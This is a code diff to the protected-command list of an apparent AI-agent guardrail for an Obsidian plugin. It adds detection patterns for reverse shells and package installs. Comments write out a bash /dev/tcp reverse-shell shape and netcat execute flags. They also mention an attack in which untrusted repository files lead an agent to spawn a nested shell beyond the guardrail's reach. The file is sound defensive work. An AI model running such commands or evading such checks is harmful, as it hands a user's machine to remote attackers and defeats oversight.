@@ -144,6 +144,22 @@ const DEFAULT_PROTECTED_COMMANDS = [
         explanation: "Classic `curl ... | bash` installer pattern. Downloads a remote script and runs it with your permissions — one of the most common ways attackers get code onto a target machine.",
     },
     {
+        // Reverse shell issued directly as a command. Anchored on the bash
+        // `/dev/tcp|/dev/udp` pseudo-device (the `bash -i >& /dev/tcp/<ip>/<port>
+        // 0>&1` shape) and netcat's execute flag (`nc -e` / `ncat --exec`).
+        // NOT anchored on a bare `bash -i`, which appears in benign debugging
+        // docs. `/dev/tcp` is essentially never used outside networking, so the
+        // false-positive floor is near zero. Catches the *directly-issued*
+        // variant of the Mozilla 0DIN clean-repo attack; the fully-nested PoC
+        // hides the shell inside a spawned interpreter (`python3 -m ...`) and is
+        // out of a tool-call guardrail's reach by construction — see README /
+        // attack-detector.ts scope note.
+        pattern: "/dev/(tcp|udp)/|\\bnc(at)?\\b[^|\\r\\n]{0,80}(\\s-e\\b|\\s--exec\\b)",
+        category: "runs-arbitrary-code",
+        userRisk: "This opens a reverse shell — a live connection that hands control of your machine to a remote computer, letting whoever is on the other end run commands as you. It is almost never something a legitimate setup step needs to do.",
+        explanation: "Reverse shell: bash `/dev/tcp` or `/dev/udp` network redirect (`bash -i >& /dev/tcp/<ip>/<port> 0>&1`) or netcat with an execute flag (`nc -e`, `ncat --exec`). Grants a remote party interactive control of the host. Anchored on the network pseudo-device / execute flag, not a bare interactive shell, to keep the false-positive floor near zero.",
+    },
+    {
         // Leading `['"]?` allows `'rm'` / `"rm"` quoted forms to match too.
         // Without the optional quote, `\brm\s+` failed on `'rm' -rf` because
         // the char after `m` is `'`, not whitespace.
@@ -664,11 +680,75 @@ const DEFAULT_PROTECTED_COMMANDS = [
     },
     {
         pattern: "\\bpip[\\d.]*\\s+install\\b",
-        category: "network-fetch",
-        userRisk: "`pip install` downloads packages from PyPI (or an attacker-specified index) and runs their setup scripts with your permissions. Package install is rarely part of an Obsidian knowledge-management workflow — if you're setting up a dev environment, this is expected; otherwise it's a download-and-execute shape.",
-        explanation: "Python package install. Runs arbitrary `setup.py` code from downloaded packages — functionally a network-fetch-to-execute primitive.",
+        category: "package-install",
+        userRisk: "This installs Python packages. Gryphon runs inside Obsidian and never needs to install packages — an install request is usually the AI going off-task or a setup step from untrusted project files.",
+        explanation: "pip install (any version-suffixed pip).",
+    },
+    {
+        pattern: "\\bpython[\\d.]*\\s+-m\\s+pip\\s+install\\b",
+        category: "package-install",
+        userRisk: "This installs Python packages via `python -m pip`. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "python -m pip install (module form).",
+    },
+    {
+        pattern: "\\b(uv|pipx)\\s+(pip\\s+install|install|add)\\b",
+        category: "package-install",
+        userRisk: "This installs Python packages via uv / pipx. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "uv pip install / uv add / pipx install.",
+    },
+    {
+        pattern: "\\b(npm|pnpm|yarn|bun)\\s+(install|add|ci|i)\\b",
+        category: "package-install",
+        userRisk: "This installs JavaScript packages. Gryphon runs inside Obsidian and never needs to install packages — an install request is usually off-task or a setup step from untrusted project files.",
+        explanation: "npm/pnpm/yarn/bun install|add|ci|i.",
+    },
+    {
+        pattern: "\\bgem\\s+install\\b",
+        category: "package-install",
+        userRisk: "This installs Ruby gems. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "gem install.",
+    },
+    {
+        pattern: "\\bbundle\\s+install\\b",
+        category: "package-install",
+        userRisk: "This installs Ruby gems from a Gemfile. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "bundle install.",
+    },
+    {
+        pattern: "\\bcargo\\s+install\\b",
+        category: "package-install",
+        userRisk: "This installs Rust crates as binaries. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "cargo install.",
+    },
+    {
+        pattern: "\\bgo\\s+install\\b",
+        category: "package-install",
+        userRisk: "This installs Go binaries. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "go install.",
+    },
+    {
+        pattern: "\\b(conda|poetry)\\s+(install|add)\\b",
+        category: "package-install",
+        userRisk: "This installs packages via conda / poetry. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "conda install / poetry add.",
+    },
+    {
+        pattern: "\\b(apt|apt-get|dnf|yum|zypper|apk)\\s+install\\b",
+        category: "package-install",
+        platforms: ["posix"],
+        userRisk: "This installs system packages via the OS package manager. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "apt/apt-get/dnf/yum/zypper/apk install.",
+    },
+    {
+        pattern: "\\bbrew\\s+install\\b",
+        category: "package-install",
+        userRisk: "This installs software via Homebrew. Gryphon runs inside Obsidian and never needs to install packages.",
+        explanation: "brew install.",
     },
 ];
+const PACKAGE_INSTALL_COMMAND_PATTERNS = DEFAULT_PROTECTED_COMMANDS
+    .filter((c) => c.category === "package-install")
+    .map((c) => c.pattern);
 // Human-readable title shown at the top of the protected-operation modal
 // for each category key used by the default pattern lists above. Keep the
 // key set in sync with the `category:` values in DEFAULT_PROTECTED_PATHS
@@ -684,10 +764,12 @@ const PROTECTED_CATEGORIES = {
     "destructive-operation": "⚠ Deletes files or data",
     "network-exec": "⚠ Runs a command on another computer",
     "network-fetch": "⚠ Downloads something from the internet",
+    "package-install": "⚠ Installs software / packages",
     "user-custom": "⚠ Matches a pattern you added",
 };
 module.exports = {
     DEFAULT_PROTECTED_PATHS,
     DEFAULT_PROTECTED_COMMANDS,
     PROTECTED_CATEGORIES,
+    PACKAGE_INSTALL_COMMAND_PATTERNS,
 };
